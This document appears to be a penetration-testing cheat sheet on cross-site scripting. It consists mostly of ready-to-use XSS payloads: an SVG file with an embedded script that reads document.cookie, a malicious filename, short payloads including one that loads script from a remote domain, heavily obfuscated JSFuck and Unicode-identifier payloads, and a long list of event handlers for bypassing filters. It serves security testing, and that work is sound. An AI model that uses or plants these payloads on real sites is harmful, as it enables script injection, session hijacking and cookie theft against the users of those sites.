# Cross-Site Scripting (XSS)

### XSS inside SVG File

```markup
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
	<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
	<script type="text/javascript">
		alert(document.cookie);
	</script>
</svg>
```

### XSS in filename

```
"><img src=x onerror=prompt(1).jpg
```

### Shortest Payloads

```markup
';alert(1);'
<script/src=//⑮.rs
```

### Weird Payloads

```javascript
//XSS using eval() and fromCharCode
<img onload="javascript:alert(String.fromCharCode(97,108,101,114,116,40,39,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,39,41,59))">

//Octal encoding
javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'

//UTF-32
%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E

//JSfuck
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()

//XSS in hidden input - Use CTRL+SHIFT+X to trigger the onclick event
<input type="hidden" accesskey="X" onclick="alert(1)">

//Unicode 's' character
<ſcript/src=//127.0.0.1/xss.js>

//Katana payload
javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()

//Lontara payload
ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()

//Cuneiform-alphabet payload
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()

//Typical iframe
<iframe src=javascript:alert(1)>
```

### Event handlers

```
"onabort",
"onactivate",
"onafterprint",
"onafterscriptexecute",
"onafterupdate",
"onanimationend",
"onanimationiteration",
"onanimationstart",
"onariarequest",
"onautocomplete",
"onautocompleteerror",
"onbeforeactivate",
"onbeforecopy",
"onbeforecut",
"onbeforedeactivate",
"onbeforeeditfocus",
"onbeforepaste",
"onbeforeprint",
"onbeforescriptexecute",
"onbeforeunload",
"onbeforeupdate",
"onbegin",
"onblur",
"onbounce",
"oncancel",
"oncanplay",
"oncanplaythrough",
"oncellchange",
"onchange",
"onclick",
"onclose",
"oncommand",
"oncompassneedscalibration",
"oncontextmenu",
"oncontrolselect",
"oncopy",
"oncuechange",
"oncut",
"ondataavailable",
"ondatasetchanged",
"ondatasetcomplete",
"ondblclick",
"ondeactivate",
"ondevicelight",
"ondevicemotion",
"ondeviceorientation",
"ondeviceproximity",
"ondrag",
"ondragdrop",
"ondragend",
"ondragenter",
"ondragleave",
"ondragover",
"ondragstart",
"ondrop",
"ondurationchange",
"onemptied",
"onend",
"onended",
"onerror",
"onerrorupdate",
"onexit",
"onfilterchange",
"onfinish",
"onfocus",
"onfocusin",
"onfocusout",
"onformchange",
"onforminput",
"onfullscreenchange",
"onfullscreenerror",
"ongotpointercapture",
"onhashchange",
"onhelp",
"oninput",
"oninvalid",
"onkeydown",
"onkeypress",
"onkeyup",
"onlanguagechange",
"onlayoutcomplete",
"onload",
"onloadeddata",
"onloadedmetadata",
"onloadstart",
"onlosecapture",
"onlostpointercapture",
"onmediacomplete",
"onmediaerror",
"onmessage",
"onmousedown",
"onmouseenter",
"onmouseleave",
"onmousemove",
"onmouseout",
"onmouseover",
"onmouseup",
"onmousewheel",
"onmove",
"onmoveend",
"onmovestart",
"onmozfullscreenchange",
"onmozfullscreenerror",
"onmozpointerlockchange",
"onmozpointerlockerror",
"onmscontentzoom",
"onmsfullscreenchange",
"onmsfullscreenerror",
"onmsgesturechange",
"onmsgesturedoubletap",
"onmsgestureend",
"onmsgesturehold",
"onmsgesturestart",
"onmsgesturetap",
"onmsgotpointercapture",
"onmsinertiastart",
"onmslostpointercapture",
"onmsmanipulationstatechanged",
"onmspointercancel",
"onmspointerdown",
"onmspointerenter",
"onmspointerleave",
"onmspointermove",
"onmspointerout",
"onmspointerover",
"onmspointerup",
"onmssitemodejumplistitemremoved",
"onmsthumbnailclick",
"onoffline",
"ononline",
"onoutofsync",
"onpage",
"onpagehide",
"onpageshow",
"onpaste",
"onpause",
"onplay",
"onplaying",
"onpointercancel",
"onpointerdown",
"onpointerenter",
"onpointerleave",
"onpointerlockchange",
"onpointerlockerror",
"onpointermove",
"onpointerout",
"onpointerover",
"onpointerup",
"onpopstate",
"onprogress",
"onpropertychange",
"onratechange",
"onreadystatechange",
"onreceived",
"onrepeat",
"onreset",
"onresize",
"onresizeend",
"onresizestart",
"onresume",
"onreverse",
"onrowdelete",
"onrowenter",
"onrowexit",
"onrowinserted",
"onrowsdelete",
"onrowsinserted",
"onscroll",
"onsearch",
"onseek",
"onseeked",
"onseeking",
"onselect",
"onselectionchange",
"onselectstart",
"onshow",
"onstalled",
"onstart",
"onstop",
"onstorage",
"onstoragecommit",
"onsubmit",
"onsuspend",
"onsynchrestored",
"ontimeerror",
"ontimeupdate",
"ontoggle",
"ontrackchange",
"ontransitionend",
"onunload",
"onurlflip",
"onuserproximity",
"onvolumechange",
"onwaiting",
"onwebkitanimationend",
"onwebkitanimationiteration",
"onwebkitanimationstart",
"onwebkitfullscreenchange",
"onwebkitfullscreenerror",
"onwebkittransitionend",
"onwheel"
```

### References

{% embed url="https://xsshunter.com" %}
Platform to hunt XSS vulnerabilities
{% endembed %}

{% embed url="https://github.com/vkbiu/KNR-XSS-Payloads" %}
XSS Payloads Repository
{% endembed %}

{% embed url="https://github.com/terjanq/Tiny-XSS-Payloads" %}
Tiny XSS Payloads
{% endembed %}
